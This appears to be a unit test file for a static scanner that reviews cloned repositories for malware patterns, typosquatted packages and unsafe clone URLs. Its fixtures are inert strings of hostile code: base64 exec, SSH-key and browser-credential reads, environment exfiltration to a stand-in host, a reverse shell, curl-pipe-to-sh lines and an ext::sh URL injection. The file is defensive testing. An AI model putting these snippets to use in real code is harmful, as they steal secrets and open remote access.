"""Master Agent's static review of a discovered repository (repo_review).

The "malicious" files below are inert text written to a temp folder and
parsed, never run."""
import json
import tempfile
import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch

from src.orchestration import repo_review


def osv_response(results: list) -> MagicMock:
    response = MagicMock()
    response.json.return_value = {"results": results}
    response.raise_for_status = lambda: None
    return response


class TreeTestCase(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.root = Path(self._tmp.name)

    def tearDown(self):
        self._tmp.cleanup()

    def write(self, name: str, text, binary: bool = False) -> None:
        path = self.root / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(text) if binary else path.write_text(text)

    def rules(self) -> dict:
        findings, _ = repo_review.scan_tree(self.root)
        return {f["rule"]: f["severity"] for f in findings}


class TestMalwarePatterns(TreeTestCase):
    def test_a_normal_training_script_has_no_blocking_finding(self):
        self.write("train.py", "import pandas as pd\nfrom sklearn.ensemble import RandomForestClassifier\n"
                               "df = pd.read_csv('data/train.csv')\nmodel = RandomForestClassifier().fit(df, df)\n"
                               "model.eval() if hasattr(model, 'eval') else None\n"
                               "print('login data and local state are columns here')\n")
        self.assertEqual(self.rules(), {})

    def test_exec_of_decoded_data_is_critical(self):
        self.write("utils.py", "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n")
        self.assertEqual(self.rules()["obfuscated_exec"], "critical")

    def test_credential_and_browser_paths_are_critical(self):
        self.write("a.py", "open(os.path.expanduser('~/.ssh/id_rsa')).read()\n")
        self.write("b.py", "p = 'AppData/Local/Google/Chrome/User Data/Default/Login Data'\n")
        self.assertEqual(self.rules()["credential_access"], "critical")

    def test_sending_environment_variables_is_critical(self):
        self.write("a.py", "import os, requests\nrequests.post('https://x.example', data=dict(os.environ))\n")
        self.assertEqual(self.rules()["exfiltration"], "critical")

    def test_a_webhook_exfiltration_channel_is_critical(self):
        self.write("a.py", "URL = 'https://discord.com/api/webhooks/1/abc'\n")
        self.assertEqual(self.rules()["exfiltration_channel"], "critical")

    def test_persistence_is_critical(self):
        self.write("a.py", "key = r'Software\\Microsoft\\Windows\\CurrentVersion\\Run'\n")
        self.assertEqual(self.rules()["persistence"], "critical")

    def test_reverse_shell_is_critical(self):
        self.write("a.py", "import socket, os, pty\ns = socket.socket()\ns.connect(('1.2.3.4', 4444))\n"
                           "os.dup2(s.fileno(), 0)\npty.spawn('/bin/sh')\n")
        self.assertEqual(self.rules()["reverse_shell"], "critical")

    def test_download_and_run_is_high(self):
        self.write("a.py", "import os\nos.system('curl http://x.example/a.sh | sh')\n")
        self.write("setup.sh", "wget -qO- http://x.example/i | bash\n")
        findings, _ = repo_review.scan_tree(self.root)
        self.assertEqual({f["path"] for f in findings if f["rule"] == "download_and_run"}, {"a.py", "setup.sh"})

    def test_an_ordinary_shell_command_is_only_a_warning(self):
        self.write("a.py", "import subprocess\nsubprocess.run(['python', 'prepare.py'])\n")
        self.assertEqual(self.rules(), {"shell_command": "medium"})

    def test_code_in_setup_py_is_high_because_pip_runs_it(self):
        self.write("setup.py", "import subprocess\nsubprocess.run(['echo', 'hi'])\nfrom setuptools import setup\n")
        self.assertEqual(self.rules(), {"setup_code:shell_command": "high"})

    def test_native_access_is_high(self):
        self.write("a.py", "import ctypes\nctypes.windll.kernel32\n")
        self.assertEqual(self.rules()["native_access"], "high")

    def test_a_large_encoded_payload_is_high(self):
        self.write("a.py", f"PAYLOAD = '{'QUJD' * 600}'\n")
        self.assertEqual(self.rules()["encoded_payload"], "high")

    def test_executables_and_disguised_executables_are_critical(self):
        self.write("tool.exe", b"MZ\x90\x00", binary=True)
        self.write("weights.csv", b"MZ\x90\x00rest", binary=True)
        findings, _ = repo_review.scan_tree(self.root)
        self.assertEqual({f["path"]: f["severity"] for f in findings if f["rule"] == "executable_binary"},
                         {"tool.exe": "critical", "weights.csv": "critical"})

    def test_auto_run_files_are_high(self):
        self.write("evil.pth", "import os\n")
        self.write("sitecustomize.py", "x = 1\n")
        findings, _ = repo_review.scan_tree(self.root)
        self.assertEqual({f["path"] for f in findings if f["rule"] == "auto_run_file"}, {"evil.pth", "sitecustomize.py"})

    def test_notebook_code_cells_are_scanned_and_outputs_are_not(self):
        notebook = {"cells": [
            {"cell_type": "code", "source": ["!pip install pandas\n", "import base64\n",
                                             "exec(base64.b64decode(x))\n"],
             "outputs": [{"data": {"image/png": "QUJD" * 5000}}]},
            {"cell_type": "markdown", "source": ["~/.ssh/id_rsa in prose is not code"]},
            {"cell_type": "code", "source": ["!curl http://x.example/a | sh"]},
        ]}
        self.write("nb.ipynb", json.dumps(notebook))
        rules = self.rules()
        self.assertEqual(rules["obfuscated_exec"], "critical")
        self.assertEqual(rules["download_and_run"], "high")
        self.assertNotIn("encoded_payload", rules)      # the image output
        self.assertNotIn("credential_access", rules)    # the markdown cell
        self.assertNotIn("shell_command", rules)        # !pip install

    def test_python_2_code_is_still_checked_as_text(self):
        self.write("old.py", "print 'hi'\nopen('/home/u/.ssh/id_rsa')\n")
        self.assertEqual(self.rules()["credential_access"], "critical")

    def test_git_metadata_is_not_scanned(self):
        self.write(".git/hooks/pre-commit.exe", b"MZ", binary=True)
        self.write("a.py", "x = 1\n")
        findings, stats = repo_review.scan_tree(self.root)
        self.assertEqual(findings, [])
        self.assertEqual(stats["python_files"], 1)


class TestDependencies(TreeTestCase):
    def test_installs_from_outside_pypi_are_high(self):
        self.write("requirements.txt", "--extra-index-url https://evil.example/simple\n"
                                       "git+https://github.com/x/y.git\npandas\n")
        with patch("requests.post", return_value=osv_response([{}])):
            findings, _ = repo_review.check_dependencies(self.root)
        self.assertEqual(sum(f["rule"] == "dependency_source" for f in findings), 2)

    def test_a_typosquat_of_a_popular_package_is_high(self):
        self.write("requirements.txt", "reqeusts==2.0\nscikit-learn==1.5.2\n")
        with patch("requests.post", return_value=osv_response([{}, {}])):
            findings, _ = repo_review.check_dependencies(self.root)
        typos = [f for f in findings if f["rule"] == "typosquat"]
        self.assertEqual(len(typos), 1)
        self.assertIn("'reqeusts'", typos[0]["evidence"])

    def test_typosquat_rule(self):
        for name, popular in (("reqeusts", "requests"), ("numpyy", "numpy"), ("scikit-lean", "scikit-learn"),
                              ("panda", "pandas")):
            self.assertEqual(repo_review.typosquat_of(name), popular, name)
        for name in ("requests", "pyaml", "pandas-ta", "torchvision", "six", "httpx", "scikit-image"):
            self.assertEqual(repo_review.typosquat_of(name), "", name)

    def test_a_known_malicious_package_is_critical(self):
        self.write("requirements.txt", "colourama\n")
        with patch("requests.post", return_value=osv_response([{"vulns": [{"id": "MAL-2022-1"}]}])) as post:
            findings, _ = repo_review.check_dependencies(self.root)
        self.assertIn("critical", {f["severity"] for f in findings if f["rule"] == "malicious_package"})
        self.assertEqual(post.call_args.kwargs["json"]["queries"][0], {"package": {"name": "colourama",
                                                                                   "ecosystem": "PyPI"}})

    def test_vulnerabilities_are_reported_for_pinned_versions_only(self):
        self.write("requirements.txt", "numpy==1.21.0\npandas\n")
        results = [{"vulns": [{"id": "GHSA-1"}, {"id": "PYSEC-2"}]}, {"vulns": [{"id": "PYSEC-OLD"}]}]
        with patch("requests.post", return_value=osv_response(results)) as post:
            findings, notes = repo_review.check_dependencies(self.root)
        vulnerable = [f for f in findings if f["rule"] == "vulnerable_package"]
        self.assertEqual(len(vulnerable), 1)
        self.assertEqual(vulnerable[0]["severity"], "medium")
        self.assertIn("numpy==1.21.0", vulnerable[0]["evidence"])
        self.assertEqual(post.call_args.kwargs["json"]["queries"][0]["version"], "1.21.0")
        self.assertIn("Checked 2", notes[0])

    def test_osv_not_reachable_is_reported_not_rejected(self):
        self.write("requirements.txt", "pandas==2.2.3\n")
        findings, notes = repo_review.check_dependencies(self.root)  # conftest blocks the network
        self.assertEqual([f["severity"] for f in findings], ["low"])
        self.assertIn("not checked", notes[0])


class TestReviewRepository(TreeTestCase):
    """review_repository with the clone replaced by a local tree."""

    def _review(self, repository=None, symlinks=()):
        def fake_clone(url, dest):
            for path in self.root.rglob("*"):
                if path.is_file():
                    target = dest / path.relative_to(self.root)
                    target.parent.mkdir(parents=True, exist_ok=True)
                    target.write_bytes(path.read_bytes())
            return {"ok": True, "error": "", "commit_sha": "abc123", "symlinks": list(symlinks)}

        repository = repository or {"repo_url": "https://github.com/author/repo", "provenance": "cited_in_paper",
                                    "license": "MIT"}
        with patch.object(repo_review, "clone_for_review", side_effect=fake_clone):
            return repo_review.review_repository(repository)

    def test_a_clean_repository_is_approved_and_its_clone_kept(self):
        self.write("train.py", "import pandas\n")
        review = self._review()
        self.assertEqual(review["verdict"], "APPROVED")
        self.assertEqual(review["commit_sha"], "abc123")
        self.assertTrue((Path(review["clone_dir"]) / "train.py").is_file())

    def test_warnings_only_is_approved_with_warnings(self):
        self.write("train.py", "import subprocess\nsubprocess.run(['python', 'x.py'])\n")
        self.assertEqual(self._review()["verdict"], "APPROVED_WITH_WARNINGS")

    def test_a_malicious_repository_is_rejected_and_its_clone_deleted(self):
        self.write("train.py", "import base64\nexec(base64.b64decode(p))\n")
        review = self._review()
        self.assertEqual(review["verdict"], "REJECTED")
        self.assertEqual(review["clone_dir"], "")
        self.assertFalse(any(repo_review.REVIEW_DIR.rglob("train.py")))
        self.assertIn("obfuscated_exec", review["summary"])

    def test_no_provenance_is_rejected(self):
        self.write("train.py", "x = 1\n")
        review = self._review({"repo_url": "https://github.com/someone/repo", "provenance": "", "license": "MIT"})
        self.assertEqual(review["verdict"], "REJECTED")
        self.assertIn("no_provenance", review["summary"])

    def test_no_python_code_is_rejected(self):
        self.write("README.md", "nothing here")
        self.assertIn("no_python_code", self._review()["summary"])

    def test_a_symlink_is_rejected(self):
        self.write("train.py", "x = 1\n")
        self.assertIn("symlink", self._review(symlinks=["data/link"])["summary"])

    def test_no_license_is_only_low(self):
        self.write("train.py", "x = 1\n")
        review = self._review({"repo_url": "https://github.com/a/r", "provenance": "author_owned", "license": ""})
        self.assertEqual(review["verdict"], "APPROVED")
        self.assertEqual(review["counts"]["low"], 1)

    def test_a_clone_failure_is_rejected(self):
        review = repo_review.review_repository({"repo_url": "https://github.com/a/r", "provenance": "author_owned"})
        self.assertEqual(review["verdict"], "REJECTED")
        self.assertIn("clone_failed", review["summary"])  # conftest disables git

    def test_only_https_urls_are_cloned(self):
        for url in ("ext::sh -c touch% /tmp/x", "file:///etc", "git@github.com:a/b.git", "http://github.com/a/b"):
            result = repo_review.clone_for_review(url, self.root / "dest")
            self.assertFalse(result["ok"], url)
            self.assertIn("https", result["error"])

    def test_a_review_error_is_a_rejection_never_an_approval(self):
        with patch.object(repo_review, "clone_for_review", side_effect=RuntimeError("boom")):
            review = repo_review.review_repository({"repo_url": "https://github.com/a/r",
                                                    "provenance": "author_owned"})
        self.assertEqual(review["verdict"], "REJECTED")
        self.assertIn("review_error", review["summary"])

    def test_the_report_names_each_finding(self):
        self.write("train.py", "import ctypes\n")
        text = repo_review.format_review(self._review())
        self.assertIn("[high] native_access train.py:1", text)
        self.assertIn("cannot prove the code is safe", text)


if __name__ == "__main__":
    unittest.main()
